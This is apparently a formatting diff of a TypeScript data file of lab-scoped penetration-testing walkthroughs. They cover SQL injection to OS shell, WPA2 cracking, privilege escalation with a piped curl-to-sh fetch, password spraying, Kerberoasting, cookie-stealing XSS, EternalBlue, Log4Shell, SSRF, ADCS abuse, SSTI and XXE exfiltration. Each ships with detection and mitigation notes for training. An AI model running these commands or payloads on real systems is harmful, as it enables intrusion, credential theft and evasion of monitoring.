@@ -118,7 +118,8 @@ export const WALKTHROUGHS: Walkthrough[] = [
       {
         title: "Enumerate tables and columns",
         narration: "Focus on the application database.",
-        command: "sqlmap -r request.txt --batch -D dvwa --tables\nsqlmap -r request.txt --batch -D dvwa -T users --columns",
+        command:
+          "sqlmap -r request.txt --batch -D dvwa --tables\nsqlmap -r request.txt --batch -D dvwa -T users --columns",
         expectedOutput:
           "Database: dvwa\n[2 tables]\n+-----------+\n| guestbook |\n| users     |\n+-----------+\n\nColumn types for users:\nuser, password, user_id, avatar",
         observation:
@@ -141,12 +142,12 @@ export const WALKTHROUGHS: Walkthrough[] = [
         command: "sqlmap -r request.txt --batch --os-shell",
         expectedOutput:
           "[INFO] retrieved web server absolute paths:\n'/var/www/html/'\nos-shell> id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
-        observation: "You have code execution as the web user. Stop; document, and cleanup any uploaded stagers.",
+        observation:
+          "You have code execution as the web user. Stop; document, and cleanup any uploaded stagers.",
         branches: [
           {
             when: "The DB user lacks FILE privileges",
-            then:
-              "Stop escalation from this angle. Report the injection with the impact demonstrated by data access. Recommend parameterised queries.",
+            then: "Stop escalation from this angle. Report the injection with the impact demonstrated by data access. Recommend parameterised queries.",
           },
         ],
       },
@@ -188,8 +189,7 @@ export const WALKTHROUGHS: Walkthrough[] = [
         branches: [
           {
             when: "airmon-ng start reports 'monitor mode NOT enabled'",
-            then:
-              "iw dev wlan0 set type monitor after ip link set wlan0 down, then ip link set wlan0 up. Some chipsets need firmware from linux-firmware.",
+            then: "iw dev wlan0 set type monitor after ip link set wlan0 down, then ip link set wlan0 up. Some chipsets need firmware from linux-firmware.",
           },
         ],
       },
@@ -206,8 +206,7 @@ export const WALKTHROUGHS: Walkthrough[] = [
         title: "Focus capture on that BSSID/channel",
         narration:
           "Lock airodump-ng on channel 6 and write pcaps to disk. Leave this running in a second terminal.",
-        command:
-          "sudo airodump-ng --bssid AA:BB:CC:11:22:33 -c 6 -w handshake wlan0mon",
+        command: "sudo airodump-ng --bssid AA:BB:CC:11:22:33 -c 6 -w handshake wlan0mon",
         expectedOutput:
           "CH  6 ][ Elapsed: 12 s ][ 2025-01-01 ...\nBSSID              STATION            PWR   Frames\nAA:BB:CC:11:22:33  DE:AD:BE:EF:00:01  -55   42",
         observation:
@@ -217,15 +216,12 @@ export const WALKTHROUGHS: Walkthrough[] = [
         title: "Force a handshake with a targeted deauth",
         narration:
           "Send a couple of deauth frames to your own client so it re-associates and completes the 4-way handshake.",
-        command:
-          "sudo aireplay-ng -0 2 -a AA:BB:CC:11:22:33 -c DE:AD:BE:EF:00:01 wlan0mon",
-        expectedOutput:
-          "Sending 64 directed DeAuth. STMAC: [DE:AD:BE:EF:00:01] [ 8|61 ACKs]",
+        command: "sudo aireplay-ng -0 2 -a AA:BB:CC:11:22:33 -c DE:AD:BE:EF:00:01 wlan0mon",
+        expectedOutput: "Sending 64 directed DeAuth. STMAC: [DE:AD:BE:EF:00:01] [ 8|61 ACKs]",
         branches: [
           {
             when: "No handshake appears after several attempts",
-            then:
-              "Move closer / increase antenna gain, or wait for a client to naturally connect. On PMKID-capable APs use hcxdumptool for clientless capture.",
+            then: "Move closer / increase antenna gain, or wait for a client to naturally connect. On PMKID-capable APs use hcxdumptool for clientless capture.",
           },
         ],
       },
@@ -239,16 +235,14 @@ export const WALKTHROUGHS: Walkthrough[] = [
       },
       {
         title: "Crack with hashcat",
-        narration:
-          "Mode 22000 = WPA-PBKDF2-PMKID+EAPOL. Use rockyou or a targeted wordlist.",
+        narration: "Mode 22000 = WPA-PBKDF2-PMKID+EAPOL. Use rockyou or a targeted wordlist.",
         command: "hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt",
         expectedOutput:
           "Session..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)\nRecovered........: 1/1 (100.00%) Digests\ncandidate: password123",
         branches: [
           {
             when: "hashcat exhausts the wordlist without cracking",
-            then:
-              "Apply rules (--rules-file=rules/best64.rule) or move to a larger set (SecLists Rockyou-75, hashesorg). If still nothing, the password is strong — report that as a good finding.",
+            then: "Apply rules (--rules-file=rules/best64.rule) or move to a larger set (SecLists Rockyou-75, hashesorg). If still nothing, the password is strong — report that as a good finding.",
           },
         ],
       },
@@ -281,15 +275,15 @@ export const WALKTHROUGHS: Walkthrough[] = [
     steps: [
       {
         title: "Stabilise the shell",
-        narration:
-          "A dumb shell breaks half the tools. Upgrade to a PTY before enumerating.",
+        narration: "A dumb shell breaks half the tools. Upgrade to a PTY before enumerating.",
         command:
           "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nexport TERM=xterm\nCtrl+Z; stty raw -echo; fg; reset",
       },
       {
         title: "Quick manual triage",
         narration: "Before running loud enumeration, check the obvious wins.",
-        command: "id\nuname -a\nsudo -l\ncat /etc/crontab\nfind / -perm -4000 -type f 2>/dev/null | head",
+        command:
+          "id\nuname -a\nsudo -l\ncat /etc/crontab\nfind / -perm -4000 -type f 2>/dev/null | head",
         expectedOutput:
           "uid=1001(dev) gid=1001(dev) groups=1001(dev),4(adm)\nLinux target 5.4.0-42 #46 x86_64 GNU/Linux\nUser dev may run the following:\n    (root) NOPASSWD: /usr/bin/find\n/usr/bin/find\n/usr/bin/passwd\n/usr/bin/sudo",
         observation:
@@ -304,13 +298,11 @@ export const WALKTHROUGHS: Walkthrough[] = [
         branches: [
           {
             when: "sudo -l reveals nothing useful",
-            then:
-              "Deploy linpeas: `curl -fsSL https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh | sh > /tmp/l.txt`. Then read only the red/yellow hits.",
+            then: "Deploy linpeas: `curl -fsSL https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh | sh > /tmp/l.txt`. Then read only the red/yellow hits.",
           },
           {
             when: "There's a writable cron script",
-            then:
-              "Watch /var/spool/cron and /etc/cron.* — inject a payload into a script that root executes. Use `pspy64` to see cron activity without root.",
+            then: "Watch /var/spool/cron and /etc/cron.* — inject a payload into a script that root executes. Use `pspy64` to see cron activity without root.",
           },
         ],
       },
@@ -323,7 +315,8 @@ export const WALKTHROUGHS: Walkthrough[] = [
       },
       {
         title: "Cleanup",
-        narration: "Remove any tool you dropped, revert changes, and write down the exact commands used.",
+        narration:
+          "Remove any tool you dropped, revert changes, and write down the exact commands used.",
         command: "rm /tmp/linpeas.sh /tmp/l.txt\nhistory -c",
       },
     ],
@@ -359,23 +352,20 @@ export const WALKTHROUGHS: Walkthrough[] = [
       {
         title: "Extract live hosts to a file",
         narration: "Any 'Up' host in the .gnmap file gets grabbed with awk.",
-        command:
-          "awk '/Up$/{print $2}' sweep.gnmap > live.txt\ncat live.txt",
+        command: "awk '/Up$/{print $2}' sweep.gnmap > live.txt\ncat live.txt",
         expectedOutput: "10.10.10.5\n10.10.10.12",
       },
       {
         title: "Fast full-port TCP scan",
         narration:
           "Blast all 65535 TCP ports at a modest rate so we don't miss anything unusual, then feed the open ones to a slower version scan.",
-        command:
-          "sudo nmap -p- --min-rate 2000 -iL live.txt -oA fast",
+        command: "sudo nmap -p- --min-rate 2000 -iL live.txt -oA fast",
         expectedOutput:
           "Nmap scan report for 10.10.10.5\nPORT      STATE SERVICE\n22/tcp    open  ssh\n80/tcp    open  http\n8443/tcp  open  https-alt",
         branches: [
           {
             when: "Scan is slow or the IDS trips",
-            then:
-              "Drop --min-rate, add -T2, and randomise: --randomize-hosts + --data-length 24. Or split with masscan first then feed nmap.",
+            then: "Drop --min-rate, add -T2, and randomise: --randomize-hosts + --data-length 24. Or split with masscan first then feed nmap.",
           },
         ],
       },
@@ -383,18 +373,17 @@ export const WALKTHROUGHS: Walkthrough[] = [
         title: "Deep service + script scan on discovered ports",
         narration:
           "-sV enables version detection; -sC runs the default scripts (a good middle ground before category scripts).",
-        command:
-          "sudo nmap -sV -sC -p 22,80,8443 10.10.10.5 -oA deep",
+        command: "sudo nmap -sV -sC -p 22,80,8443 10.10.10.5 -oA deep",
         expectedOutput:
           "22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp   open  http    nginx 1.18.0\n|_http-title: Welcome to nginx\n8443/tcp open  ssl/https\n| ssl-cert: Subject: CN=lab.local\n| Not valid before: 2024-01-01",
-        observation: "SSH is on a modern version; the web on 8443 uses a self-signed cert — probably an admin panel. That's your next enumeration target.",
+        observation:
+          "SSH is on a modern version; the web on 8443 uses a self-signed cert — probably an admin panel. That's your next enumeration target.",
       },
       {
         title: "Targeted NSE for vulns",
         narration:
           "Run the `vuln` and `vulners` categories only on services that matter. Don't blast --script=all on production.",
-        command:
-          "sudo nmap --script vuln,vulners -p 80,8443 10.10.10.5 -oA vulns",
+        command: "sudo nmap --script vuln,vulners -p 80,8443 10.10.10.5 -oA vulns",
       },
     ],
     successCriteria:
@@ -422,27 +411,23 @@ export const WALKTHROUGHS: Walkthrough[] = [
         title: "Build a minimal userlist and short candidate list",
         narration:
           "A spray uses ONE password against MANY users. Use a small, contextual list (Season + year etc.) rather than rockyou to avoid lockouts.",
-        command:
-          "printf 'alice\\nbob\\n' > users.txt\nprintf 'Autumn2025!\\nWelcome1\\n' > pw.txt",
+        command: "printf 'alice\\nbob\\n' > users.txt\nprintf 'Autumn2025!\\nWelcome1\\n' > pw.txt",
       },
       {
         title: "Run hydra slowly with jitter",
         narration:
           "-t 1 keeps it serial. -W 5 waits 5s between attempts. -f stops on first success. This is polite, and mimics a real spray.",
-        command:
-          "hydra -L users.txt -P pw.txt -t 1 -W 5 -f ssh://10.10.10.5 -o spray.log",
+        command: "hydra -L users.txt -P pw.txt -t 1 -W 5 -f ssh://10.10.10.5 -o spray.log",
         expectedOutput:
           "[22][ssh] host: 10.10.10.5   login: bob   password: Welcome1\n1 of 1 target successfully completed",
         branches: [
           {
             when: "Every attempt returns 'Connection refused' after a few tries",
-            then:
-              "fail2ban is banning your IP. Slow down further, rotate through a proxy pool if authorised, or ask the sysadmin to whitelist you.",
+            then: "fail2ban is banning your IP. Slow down further, rotate through a proxy pool if authorised, or ask the sysadmin to whitelist you.",
           },
           {
             when: "You need to test against a bastion/2FA host",
-            then:
-              "Stop. You can't spray past a properly configured 2FA. Document it as a good finding.",
+            then: "Stop. You can't spray past a properly configured 2FA. Document it as a good finding.",
           },
         ],
       },
@@ -467,7 +452,8 @@ export const WALKTHROUGHS: Walkthrough[] = [
     title: "A disciplined hashcat cracking session",
     scenario:
       "You've been handed a dump of unknown hashes from a breach exercise. You'll identify the algorithm, choose the right mode, run a smart attack sequence, and stop when marginal returns plateau.",
-    labSetup: "Any host with a GPU or CPU-only hashcat. Sample hashes on hashcat.net/wiki/doku.php?id=example_hashes.",
+    labSetup:
+      "Any host with a GPU or CPU-only hashcat. Sample hashes on hashcat.net/wiki/doku.php?id=example_hashes.",
     duration: "30–120 minutes",
     difficulty: "intermediate",
     legalNote: LAB_NOTE,
@@ -478,8 +464,7 @@ export const WALKTHROUGHS: Walkthrough[] = [
         narration:
           "Don't guess. hashid + a manual eye on length and prefix works. NTLM = 32 hex chars, sha512crypt = $6$…, bcrypt = $2b$…",
         command: "hashid -m 'e10adc3949ba59abbe56e057f20f883e'",
-        expectedOutput:
-          "[+] MD5 [Hashcat Mode: 0]\n[+] NTLM [Hashcat Mode: 1000]",
+        expectedOutput: "[+] MD5 [Hashcat Mode: 0]\n[+] NTLM [Hashcat Mode: 1000]",
       },
       {
         title: "Sanity-check with a benchmark",
@@ -490,30 +475,25 @@ export const WALKTHROUGHS: Walkthrough[] = [
       {
         title: "Attack #1 — straight wordlist",
         narration: "Always start with rockyou (or a corpus-specific list).",
-        command:
-          "hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --status",
-        expectedOutput:
-          "Recovered........: 34/128 (26.56%) Digests",
+        command: "hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --status",
+        expectedOutput: "Recovered........: 34/128 (26.56%) Digests",
       },
       {
         title: "Attack #2 — rules on the leftover",
         narration:
           "hashcat replays your list with mutations. best64 is a great first pass; d3ad0ne and OneRuleToRuleThemAll for later.",
-        command:
-          "hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/best64.rule --loopback",
+        command: "hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r rules/best64.rule --loopback",
         expectedOutput: "Recovered........: 71/128 (55.47%) Digests",
       },
       {
         title: "Attack #3 — targeted mask for the tail",
         narration:
           "The remaining hashes are probably 'strong'. Try a mask that matches the target's password policy (e.g. one upper, six lower, two digits, one symbol).",
-        command:
-          "hashcat -m 1000 -a 3 hashes.txt '?u?l?l?l?l?l?l?d?d?s'",
+        command: "hashcat -m 1000 -a 3 hashes.txt '?u?l?l?l?l?l?l?d?d?s'",
         branches: [
           {
             when: "Runtime for the mask is >48h",
-            then:
-              "Shorten with a hybrid attack (-a 6 wordlist + ?d?d?s). Do NOT run cost-prohibitive masks in engagement time.",
+            then: "Shorten with a hybrid attack (-a 6 wordlist + ?d?d?s). Do NOT run cost-prohibitive masks in engagement time.",
           },
         ],
       },
@@ -549,10 +529,8 @@ export const WALKTHROUGHS: Walkthrough[] = [
         title: "Confirm reflection and identify context",
         narration:
           "Send a benign marker string; look at where it lands in the HTML — attribute, script block, or text?",
-        command:
-          "curl -s 'https://target.tld/search?q=zzMARKERzz' | grep -n MARKER",
-        expectedOutput:
-          "42: <input name=\"q\" value=\"zzMARKERzz\">",
+        command: "curl -s 'https://target.tld/search?q=zzMARKERzz' | grep -n MARKER",
+        expectedOutput: '42: <input name="q" value="zzMARKERzz">',
         observation: "Reflected inside an attribute value — break out with a quote.",
       },
       {
@@ -561,7 +539,7 @@ export const WALKTHROUGHS: Walkthrough[] = [
           "Try the minimum payload that would break the attribute and inject an event handler.",
         command:
           "curl -s 'https://target.tld/search?q=%22%3E%3Cimg+src+onerror%3Dalert(1)%3E' | grep -n onerror",
-        expectedOutput: "42: <input name=\"q\" value=\"\"><img src onerror=alert(1)>\">",
+        expectedOutput: '42: <input name="q" value=""><img src onerror=alert(1)>">',
       },
       {
         title: "Build the shareable PoC URL",
@@ -575,18 +553,15 @@ export const WALKTHROUGHS: Walkthrough[] = [
         narration:
           "Spin up a plain nc listener that just logs incoming requests. Click the link in an incognito tab, then read the log.",
         command: "nc -lvnp 8000",
-        expectedOutput:
-          "GET /?c=PHPSESSID=abcdef123456 HTTP/1.1\nHost: collector.lab",
+        expectedOutput: "GET /?c=PHPSESSID=abcdef123456 HTTP/1.1\nHost: collector.lab",
         branches: [
           {
             when: "Cookie has HttpOnly set",
-            then:
-              "Cookie theft won't work; demonstrate account takeover via a fetch() to the profile endpoint that changes the email, showing session-riding impact instead.",
+            then: "Cookie theft won't work; demonstrate account takeover via a fetch() to the profile endpoint that changes the email, showing session-riding impact instead.",
           },
           {
             when: "CSP blocks the injected script",
-            then:
-              "Check CSP header — unsafe-inline? external allowed? try a <script src=…> from an allowed domain, or move to attribute-only payloads with onerror/onclick.",
+            then: "Check CSP header — unsafe-inline? external allowed? try a <script src=…> from an allowed domain, or move to attribute-only payloads with onerror/onclick.",
           },
         ],
       },
@@ -608,16 +583,14 @@ export const WALKTHROUGHS: Walkthrough[] = [
     labSetup: "HTB 'Blue' or an intentionally-vuln Win7 VM.",
     duration: "20 minutes",
     difficulty: "beginner",
-    legalNote:
-      "EternalBlue can crash unpatched hosts. Only run in a lab where downtime is fine.",
+    legalNote: "EternalBlue can crash unpatched hosts. Only run in a lab where downtime is fine.",
     toolSlugs: ["metasploit", "nmap"],
     steps: [
       {
         title: "Pre-check with nmap NSE",
         narration:
           "Always run smb-vuln-ms17-010 before firing the exploit; it also fingerprints if the box will BSOD.",
-        command:
-          "nmap -p445 --script smb-vuln-ms17-010 10.10.10.40",
+        command: "nmap -p445 --script smb-vuln-ms17-010 10.10.10.40",
         expectedOutput:
           "Host script results:\n| smb-vuln-ms17-010:\n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (MS17-010)",
       },
@@ -627,8 +600,7 @@ export const WALKTHROUGHS: Walkthrough[] = [
           "Use the eternalblue module; set RHOSTS, LHOST (your tun0), and use a staged reverse TCP.",
         command:
           "msfconsole -q\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.10.10.40\nset LHOST 10.10.14.2\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\ncheck",
-        expectedOutput:
-          "[+] 10.10.10.40:445 - The target is vulnerable.",
+        expectedOutput: "[+] 10.10.10.40:445 - The target is vulnerable.",
       },
       {
         title: "Run it",
@@ -640,8 +612,7 @@ export const WALKTHROUGHS: Walkthrough[] = [
         branches: [
           {
             when: "Target BSODs",
-            then:
-              "Reboot the VM. Try the manual auxiliary/admin/smb/ms17_010_command flavour with a simpler payload.",
+            then: "Reboot the VM. Try the manual auxiliary/admin/smb/ms17_010_command flavour with a simpler payload.",
           },
         ],
       },
@@ -677,23 +648,20 @@ export const WALKTHROUGHS: Walkthrough[] = [
     steps: [
       {
         title: "Confirm creds work",
-        narration:
-          "Prove you can auth to LDAP before doing anything else. crackmapexec is polite.",
+        narration: "Prove you can auth to LDAP before doing anything else. crackmapexec is polite.",
         command: "crackmapexec ldap dc01.lab.local -u alice -p 'Autumn2025!' -k",
       },
       {
         title: "Enumerate SPNs (accounts with kerberoastable tickets)",
         narration:
           "Any user with a servicePrincipalName can have a TGS requested by anyone who is authenticated to the domain — that's the primitive.",
-        command:
-          "impacket-GetUserSPNs lab.local/alice:'Autumn2025!' -dc-ip 10.10.10.10",
+        command: "impacket-GetUserSPNs lab.local/alice:'Autumn2025!' -dc-ip 10.10.10.10",
         expectedOutput:
           "ServicePrincipalName             Name          MemberOf         PasswordLastSet\nMSSQLSvc/sql01.lab.local:1433    sqlsvc        Domain Users     2020-04-11 ...",
       },
       {
         title: "Request the tickets",
-        narration:
-          "-request writes tickets in $krb5tgs$23$*…* — hashcat mode 13100.",
+        narration: "-request writes tickets in $krb5tgs$23$*…* — hashcat mode 13100.",
         command:
           "impacket-GetUserSPNs lab.local/alice:'Autumn2025!' -dc-ip 10.10.10.10 -request -outputfile tgs.hash",
       },
@@ -701,15 +669,12 @@ export const WALKTHROUGHS: Walkthrough[] = [
         title: "Crack offline",
         narration:
           "Service passwords are often set-and-forget from 2015. rockyou usually cracks them.",
-        command:
-          "hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -r rules/best64.rule",
-        expectedOutput:
-          "sqlsvc:Summer2019!\n1 of 1 hashes cracked",
+        command: "hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -r rules/best64.rule",
+        expectedOutput: "sqlsvc:Summer2019!\n1 of 1 hashes cracked",
         branches: [
           {
             when: "No hits in rockyou",
-            then:
-              "Use a corp-flavoured wordlist (CompanyName + season + year), or move to AS-REP roasting on any pre-auth-disabled users.",
+            then: "Use a corp-flavoured wordlist (CompanyName + season + year), or move to AS-REP roasting on any pre-auth-disabled users.",
           },
         ],
       },
@@ -717,8 +682,7 @@ export const WALKTHROUGHS: Walkthrough[] = [
         title: "Use the credential responsibly",
         narration:
           "Log in with the cracked service account only within scope, do NOT touch prod DBs, and shred artefacts.",
-        command:
-          "crackmapexec mssql sql01.lab.local -u sqlsvc -p 'Summer2019!'\nshred -u tgs.hash",
+        command: "crackmapexec mssql sql01.lab.local -u sqlsvc -p 'Summer2019!'\nshred -u tgs.hash",
       },
     ],
     successCriteria:
@@ -751,8 +715,7 @@ export const WALKTHROUGHS: Walkthrough[] = [
       },
       {
         title: "Directory brute-force with size filtering",
-        narration:
-          "-fs 132 filters out the fake-404 length so only real content shows up.",
+        narration: "-fs 132 filters out the fake-404 length so only real content shows up.",
         command:
           "ffuf -u https://target.tld/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fs 132 -mc all",
         expectedOutput:
@@ -773,14 +736,14 @@ export const WALKTHROUGHS: Walkthrough[] = [
       },
       {
         title: "Extensions matter",
-        narration: "Try common file extensions for the language/framework detected (PHP → .php, .bak).",
+        narration:
+          "Try common file extensions for the language/framework detected (PHP → .php, .bak).",
         command:
           "ffuf -u https://target.tld/FUZZ -w raft-medium-files.txt -e .php,.bak,.old,.zip -fs 132",
         branches: [
           {
             when: "You get rate-limited (429)",
-            then:
-              "Drop concurrency: -t 5, and add -p 0.2-0.5 for jitter. If the WAF blocks, coordinate an allowlist window with the client.",
+            then: "Drop concurrency: -t 5, and add -p 0.2-0.5 for jitter. If the WAF blocks, coordinate an allowlist window with the client.",
           },
         ],
       },
@@ -815,28 +778,24 @@ export const WALKTHROUGHS: Walkthrough[] = [
       },
       {
         title: "Full enum with enum4linux-ng",
-        narration:
-          "Sweeps null sessions across users, groups, shares, OS info, policies.",
+        narration: "Sweeps null sessions across users, groups, shares, OS info, policies.",
         command: "enum4linux-ng -A 10.10.10.5",
       },
       {
         title: "Login-agnostic sweep with crackmapexec",
-        narration:
-          "Sprays a whole subnet quickly to identify what accepts null / guest.",
+        narration: "Sprays a whole subnet quickly to identify what accepts null / guest.",
         command: "crackmapexec smb 10.10.10.0/24 -u '' -p ''",
         branches: [
           {
             when: "Server signing = True everywhere",
-            then:
-              "NTLM relay is off the table on those hosts. Look for hosts with 'signing:False' — those are relay-eligible.",
+            then: "NTLM relay is off the table on those hosts. Look for hosts with 'signing:False' — those are relay-eligible.",
           },
         ],
       },
       {
         title: "Pull anonymous shares",
         narration: "Mount, mirror, and search for creds in scripts and .config files.",
-        command:
-          "smbclient //10.10.10.5/public -N -c 'recurse ON; prompt OFF; mget *'",
+        command: "smbclient //10.10.10.5/public -N -c 'recurse ON; prompt OFF; mget *'",
       },
     ],
     successCriteria:
@@ -854,7 +813,8 @@ export const WALKTHROUGHS: Walkthrough[] = [
     title: "Log4Shell — safe reproduction in a lab",
     scenario:
       "Reproduce CVE-2021-44228 against a purpose-built vulnerable app and confirm the callback without shipping a payload.",
-    labSetup: "Docker image ghcr.io/christophetd/log4shell-vulnerable-app on an isolated bridge network.",
+    labSetup:
+      "Docker image ghcr.io/christophetd/log4shell-vulnerable-app on an isolated bridge network.",
     duration: "20 minutes",
     difficulty: "beginner",
     legalNote: LAB_NOTE,
@@ -863,7 +823,8 @@ export const WALKTHROUGHS: Walkthrough[] = [
       {
         title: "Stand up the vulnerable app",
         narration: "One-shot Docker run — no ports exposed to the host beyond localhost.",
-        command: "docker run --rm -p 127.0.0.1:8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app",
+        command:
+          "docker run --rm -p 127.0.0.1:8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app",
       },
       {
         title: "Start a DNS-only listener",
@@ -882,15 +843,15 @@ export const WALKTHROUGHS: Walkthrough[] = [
         branches: [
           {
             when: "No DNS callback arrives",
-            then:
-              "Confirm outbound DNS from the docker network. Try ${${lower:jndi}:ldap://...} to defeat simple string filters.",
+            then: "Confirm outbound DNS from the docker network. Try ${${lower:jndi}:ldap://...} to defeat simple string filters.",
           },
         ],
       },
     ],
     successCriteria: "OOB DNS callback observed; no code executed.",
     detectionSummary: "WAF signature for '${jndi:' patterns; outbound LDAP/DNS from JVMs.",
-    mitigationSummary: "Upgrade log4j >= 2.17.1; set -Dlog4j2.formatMsgNoLookups=true; egress-filter JVM hosts.",
+    mitigationSummary:
+      "Upgrade log4j >= 2.17.1; set -Dlog4j2.formatMsgNoLookups=true; egress-filter JVM hosts.",
   },
   {
     slug: "ssrf-metadata",
@@ -924,8 +885,10 @@ export const WALKTHROUGHS: Walkthrough[] = [
       },
     ],
     successCriteria: "Retrieved a role credential document via SSRF.",
-    detectionSummary: "Outbound requests from app servers to 169.254.169.254; unusual IAM API from EC2 role.",
-    mitigationSummary: "Enforce IMDSv2 (hop-limit=1, token required); block 169.254.169.254 at the app layer; use allow-lists for URL fetchers.",
+    detectionSummary:
+      "Outbound requests from app servers to 169.254.169.254; unusual IAM API from EC2 role.",
+    mitigationSummary:
+      "Enforce IMDSv2 (hop-limit=1, token required); block 169.254.169.254 at the app layer; use allow-lists for URL fetchers.",
   },
   {
     slug: "kerberoast-lab",
@@ -946,12 +909,14 @@ export const WALKTHROUGHS: Walkthrough[] = [
         title: "Request TGS for accounts with SPNs",
         command:
           "impacket-GetUserSPNs -request -dc-ip 10.10.0.10 lab.local/alice:'Winter2024!' -outputfile tgs.hash",
-        expectedOutput: "ServicePrincipalName  Name    MemberOf\nMSSQLSvc/sql01.lab...  svc_sql  ...",
+        expectedOutput:
+          "ServicePrincipalName  Name    MemberOf\nMSSQLSvc/sql01.lab...  svc_sql  ...",
       },
       {
         title: "Crack offline",
         command: "hashcat -m 13100 tgs.hash rockyou.txt -O",
-        observation: "Any cracked service account may lead to lateral movement or DA depending on group membership.",
+        observation:
+          "Any cracked service account may lead to lateral movement or DA depending on group membership.",
         branches: [
           {
             when: "No hashes cracked",
@@ -961,8 +926,10 @@ export const WALKTHROUGHS: Walkthrough[] = [
       },
     ],
     successCriteria: "At least one service-account plaintext password recovered in the lab.",
-    detectionSummary: "Volume of Kerberos TGS-REQ (event 4769) with RC4 encryption type from a single user.",
-    mitigationSummary: "Long random passwords / gMSAs for service accounts; disable RC4; monitor 4769 for RC4.",
+    detectionSummary:
+      "Volume of Kerberos TGS-REQ (event 4769) with RC4 encryption type from a single user.",
+    mitigationSummary:
+      "Long random passwords / gMSAs for service accounts; disable RC4; monitor 4769 for RC4.",
   },
   {
     slug: "adcs-esc1-lab",
@@ -977,8 +944,7 @@ export const WALKTHROUGHS: Walkthrough[] = [
     steps: [
       {
         title: "Find vulnerable templates",
-        command:
-          "certipy-ad find -u alice@lab.local -p 'PW' -dc-ip 10.10.0.10 -vulnerable -stdout",
+        command: "certipy-ad find -u alice@lab.local -p 'PW' -dc-ip 10.10.0.10 -vulnerable -stdout",
       },
       {
         title: "Request a cert impersonating administrator",
@@ -997,14 +963,15 @@ export const WALKTHROUGHS: Walkthrough[] = [
       },
     ],
     successCriteria: "Full domain hash dump.",
-    detectionSummary: "Certificate issuance events (4886/4887) for a template with SAN override; unusual PKINIT logons.",
-    mitigationSummary: "Remove enrollee-supplies-subject; require CA manager approval; audit templates with certipy-find.",
+    detectionSummary:
+      "Certificate issuance events (4886/4887) for a template with SAN override; unusual PKINIT logons.",
+    mitigationSummary:
+      "Remove enrollee-supplies-subject; require CA manager approval; audit templates with certipy-find.",
   },
   {
     slug: "wpa2-handshake-hashcat",
     title: "WPA2 handshake capture & offline crack",
-    scenario:
-      "Capture a 4-way handshake from your own AP, convert, and crack with hashcat.",
+    scenario: "Capture a 4-way handshake from your own AP, convert, and crack with hashcat.",
     labSetup: "A WPA2 AP you own; USB Wi-Fi adapter with monitor mode.",
     duration: "45 minutes",
     difficulty: "intermediate",
@@ -1031,7 +998,8 @@ export const WALKTHROUGHS: Walkthrough[] = [
     ],
     successCriteria: "Recovered your own AP's PSK in the lab.",
     detectionSummary: "Deauth floods, unknown clients probing SSID lists.",
-    mitigationSummary: "Long random PSK, WPA3-SAE where possible, 802.11w for management-frame protection.",
+    mitigationSummary:
+      "Long random PSK, WPA3-SAE where possible, 802.11w for management-frame protection.",
   },
   {
     slug: "ssti-jinja2",
@@ -1043,7 +1011,11 @@ export const WALKTHROUGHS: Walkthrough[] = [
     legalNote: LAB_NOTE,
     toolSlugs: ["curl", "burpsuite-community"],
     steps: [
-      { title: "Fingerprint the engine", command: "curl 'http://app.lab.local/?name={{7*7}}'", expectedOutput: "Hello 49" },
+      {
+        title: "Fingerprint the engine",
+        command: "curl 'http://app.lab.local/?name={{7*7}}'",
+        expectedOutput: "Hello 49",
+      },
       {
         title: "Prove Python context",
         command: "curl --data-urlencode 'name={{7*\"7\"}}' 'http://app.lab.local/'",
@@ -1058,8 +1030,10 @@ export const WALKTHROUGHS: Walkthrough[] = [
       },
     ],
     successCriteria: "RCE demonstrated as the Flask process user.",
-    detectionSummary: "Template-render errors with '__' access in logs; egress from the app to unusual hosts.",
-    mitigationSummary: "Never render user input as a template; use safe template rendering with autoescape and a strict sandbox.",
+    detectionSummary:
+      "Template-render errors with '__' access in logs; egress from the app to unusual hosts.",
+    mitigationSummary:
+      "Never render user input as a template; use safe template rendering with autoescape and a strict sandbox.",
   },
   {
     slug: "xxe-oob",
@@ -1072,17 +1046,22 @@ export const WALKTHROUGHS: Walkthrough[] = [
     legalNote: LAB_NOTE,
     toolSlugs: ["curl"],
     steps: [
-      { title: "Host a malicious DTD",
-        narration: "Serve a DTD on your attacker box that reads /etc/hostname and beacons it back over HTTP.",
-        command: "python3 -m http.server 8000 --directory ./dtd" },
-      { title: "Send the XXE payload",
-        command:
-          "curl -H 'Content-Type: application/xml' --data @xxe.xml http://app.lab.local/api" },
+      {
+        title: "Host a malicious DTD",
+        narration:
+          "Serve a DTD on your attacker box that reads /etc/hostname and beacons it back over HTTP.",
+        command: "python3 -m http.server 8000 --directory ./dtd",
+      },
+      {
+        title: "Send the XXE payload",
+        command: "curl -H 'Content-Type: application/xml' --data @xxe.xml http://app.lab.local/api",
+      },
       { title: "Observe the callback with the filename encoded" },
     ],
     successCriteria: "OOB request received containing the file contents.",
     detectionSummary: "XML parsers making outbound HTTP requests; unusual egress from app tier.",
-    mitigationSummary: "Disable external entity resolution in the parser (LIBXML_NONET, DTDLoader=null in Java).",
+    mitigationSummary:
+      "Disable external entity resolution in the parser (LIBXML_NONET, DTDLoader=null in Java).",
   },
   {
     slug: "eternalblue-lab",
@@ -1096,9 +1075,12 @@ export const WALKTHROUGHS: Walkthrough[] = [
     toolSlugs: ["nmap", "metasploit-framework"],
     steps: [
       { title: "Detect", command: "nmap -p445 --script smb-vuln-ms17-010 10.10.10.20" },
